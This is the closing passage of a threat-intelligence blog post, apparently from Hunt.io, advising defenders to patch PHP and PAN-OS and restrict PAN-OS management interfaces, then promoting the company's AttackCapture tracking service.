For defenders, that makes the response the boring one, and the right one: patch to a supported PHP build, patch or restrict PAN-OS management interfaces, and keep eyes on internet-facing PHP. On the open web the mass wave has not arrived. Against PAN-OS it already has. The behavioral signatures above are enough to catch attempts today.

**We will keep tracking this infrastructure as it moves, and our open-directory data is usually where a real shift surfaces first. You can follow the same hosts in [AttackCapture™](https://hunt.io/features/attackcapture), or [book a walkthrough](https://hunt.io/get-started) to see how we map them.**

Related Posts

Related Posts

Related Posts
